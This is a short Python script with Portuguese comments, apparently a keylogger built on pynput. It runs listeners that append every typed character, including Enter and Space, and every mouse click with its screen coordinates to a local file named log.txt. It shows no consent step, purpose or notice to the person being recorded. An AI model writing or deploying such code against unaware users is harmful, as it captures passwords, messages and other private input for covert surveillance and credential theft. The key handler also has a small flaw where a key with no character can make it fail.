from pynput import keyboard, mouse

# Função para converter a tecla pressionada em uma string
def get_key_str(key):
    if hasattr(key, 'char'):
        return key.char.upper() if key.char.isalpha() else key.char
    elif key == keyboard.Key.enter:
        return '\n[ENTER]\n'
    elif key == keyboard.Key.space:
        return ' '
    else:
        return ''

# Função chamada quando uma tecla é pressionada
def on_press(key):
    key_str = get_key_str(key)
    if key_str:
        with open('log.txt', 'a', encoding='utf-8') as f:
            f.write(key_str + '\n')

# Função chamada quando um clique do mouse é detectado
def on_click(x, y, button, pressed):
    if pressed:
        with open('log.txt', 'a') as f:
            f.write(f'Mouse clicked at ({x}, {y}) with button {button}\n')

# Criar objetos para monitorar eventos de teclado e mouse
with keyboard.Listener(on_press=on_press) as listener1, mouse.Listener(on_click=on_click) as listener2:
    # Manter os listeners em execução
    listener1.join()
    listener2.join()
